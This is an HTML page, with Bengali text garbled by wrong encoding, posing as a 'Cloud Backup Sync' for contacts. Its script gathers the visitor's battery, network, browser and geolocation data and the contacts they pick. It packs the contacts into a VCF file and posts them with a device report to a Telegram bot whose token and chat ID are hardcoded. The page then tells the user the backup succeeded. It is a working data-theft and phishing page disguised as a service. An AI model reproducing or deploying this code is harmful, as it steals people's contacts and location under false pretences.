<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact Cloud Backup</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root { 
            --primary: #0088cc; 
            --accent: #ff9f43;
            --success: #2ecc71; 
            --bg: #f8f9fa; 
        }
        
        body { 
            font-family: 'Hind Siliguri', sans-serif; 
            background: var(--bg); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }

        .card { 
            background: #ffffff; 
            padding: 40px; 
            border-radius: 30px; 
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.1); 
            text-align: center; 
            width: 380px; 
            border: 1px solid #eee;
        }

        .icon-circle {
            width: 80px;
            height: 80px;
            background: rgba(0, 136, 204, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 35px;
        }

        h2 { color: #1e272e; margin-bottom: 8px; font-weight: 600; }
        p { color: #576574; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }

        .counter-badge {
            background: var(--accent);
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 13px;
            display: none;
            margin-bottom: 15px;
            animation: fadeIn 0.5s;
        }

        .btn { 
            background: linear-gradient(135deg, #0088cc, #00d2ff); 
            color: white; 
            border: none; 
            padding: 18px; 
            font-size: 17px; 
            font-weight: bold; 
            border-radius: 18px; 
            cursor: pointer; 
            width: 100%; 
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.2);
        }

        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 136, 204, 0.3); }
        .btn:disabled { background: #dcdde1; cursor: not-allowed; transform: none; box-shadow: none; }

        #status { margin-top: 25px; font-size: 14px; font-weight: 500; color: #333; }
        
        .prog-container {
            width: 100%;
            height: 8px;
            background: #eee;
            border-radius: 10px;
            margin-top: 20px;
            overflow: hidden;
            display: none;
        }
        .prog-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.5s ease; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="card">
    <div class="icon-circle">üìÇ</div>
    <div id="counter" class="counter-badge"></div>
    <h2>‡¶ï‡ßç‡¶≤‡¶æ‡¶â‡¶° ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶∏‡¶ø‡¶ô‡ßç‡¶ï</h2>
    <p>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶è‡¶¨‡¶Ç ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶Æ‡ßá‡¶ü‡¶æ‡¶°‡ßá‡¶ü‡¶æ ‡¶∏‡ßÅ‡¶∞‡¶ï‡ßç‡¶∑‡¶ø‡¶§‡¶≠‡¶æ‡¶¨‡ßá ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶ï‡¶∞‡¶§‡ßá ‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶¨‡¶æ‡¶ü‡¶®‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</p>
    
    <button id="actionBtn" class="btn">‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
    
    <div class="prog-container" id="progCont">
        <div class="prog-bar" id="progBar"></div>
    </div>
    <div id="status">‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶Ö‡¶®‡¶≤‡¶æ‡¶á‡¶®</div>
</div>

<script>
    const CONFIG = {
        BOT_TOKEN: '7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc',
        CHAT_ID: '5923885908'
    };

    const btn = document.getElementById('actionBtn');
    const status = document.getElementById('status');
    const counter = document.getElementById('counter');
    const progCont = document.getElementById('progCont');
    const progBar = document.getElementById('progBar');

    btn.addEventListener('click', async () => {
        try {
            // ‡ßß. ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶§‡¶•‡ßç‡¶Ø (Battery & Network)
            const battery = await navigator.getBattery();
            const batteryInfo = `üîã ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø: ${Math.round(battery.level * 100)}% (${battery.charging ? '‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶π‡¶ö‡ßç‡¶õ‡ßá' : '‡¶°‡¶ø‡¶∏‡¶ö‡¶æ‡¶∞‡ßç‡¶ú‡¶ø‡¶Ç'})`;
            const netInfo = `üåê ‡¶®‡ßá‡¶ü‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶ï: ${navigator.connection?.effectiveType || '‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ'}`;
            const devInfo = `üì± ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞: ${navigator.userAgent.split(' ')[0]}`;

            // ‡ß®. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® (‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶ö‡¶æ‡¶á‡¶≤‡ßá)
            let locData = "üìç ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶®: ‡¶Ö‡¶´‡¶≤‡¶æ‡¶á‡¶®";
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 4000});
                });
                locData = `üìç ‡¶Æ‡ßç‡¶Ø‡¶æ‡¶™ ‡¶≤‡¶ø‡¶Ç‡¶ï: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            } catch(e) {}

            // ‡ß©. ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡¶∂‡¶® (‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶æ‡¶∞ ‡¶´‡¶ø‡¶ö‡¶æ‡¶∞ ‡¶∏‡¶π)
            if (!('contacts' in navigator)) throw new Error("‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞‡¶ü‡¶ø ‡¶â‡¶™‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶®‡ßü‡•§");
            
            status.innerText = "‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶≤‡¶ø‡¶∏‡ßç‡¶ü ‡¶≤‡ßã‡¶° ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";
            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

            if (contacts.length > 0) {
                // ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶æ‡¶∞ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
                counter.innerText = `‚úÖ ${contacts.length}‡¶ü‡¶ø ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶ó‡ßá‡¶õ‡ßá`;
                counter.style.display = "inline-block";
                
                btn.disabled = true;
                progCont.style.display = "block";
                status.innerText = "‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";
                progBar.style.width = "40%";

                // ‡ß™. VCF ‡¶´‡¶æ‡¶á‡¶≤ ‡¶è‡¶¨‡¶Ç ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶ú‡ßá‡¶®‡¶æ‡¶∞‡ßá‡¶∂‡¶®
                let vcfText = "";
                contacts.forEach(c => {
                    const n = c.name ? c.name[0] : "‡¶Ö‡¶ö‡ßá‡¶®‡¶æ";
                    const p = c.tel ? c.tel[0] : "‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶®‡ßá‡¶á";
                    vcfText += `BEGIN:VCARD\nVERSION:3.0\nFN:${n}\nTEL:${p}\nEND:VCARD\n`;
                });

                const report = `üì¢ **‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü**\n\n${devInfo}\n${batteryInfo}\n${netInfo}\n${locData}\n\nüî¢ ‡¶Æ‡ßã‡¶ü ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü: ${contacts.length}`;

                // ‡ß´. ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶ü‡ßç‡¶∞‡¶æ‡¶®‡ßç‡¶∏‡¶´‡¶æ‡¶∞
                await sendReport(report, vcfText);

                progBar.style.width = "100%";
                status.innerText = "‚úÖ ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶π‡ßü‡ßá‡¶õ‡ßá!";
                status.style.color = "#2ecc71";
            } else {
                status.innerText = "‡¶ï‡ßã‡¶®‡ßã ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡¶®‡¶ø‡•§";
            }

        } catch (err) {
            status.innerText = "‡¶è‡¶∞‡¶∞: " + err.message;
            status.style.color = "#e74c3c";
            btn.disabled = false;
        }
    });

    async function sendReport(text, vcf) {
        // ‡ßß. ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
        });

        // ‡ß®. VCF ‡¶´‡¶æ‡¶á‡¶≤ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        const blob = new Blob([vcf], { type: 'text/vcard' });
        const formData = new FormData();
        formData.append('chat_id', CONFIG.CHAT_ID);
        formData.append('document', blob, 'Contacts_Backup.vcf');

        return fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
    }
</script>

</body>
</html>
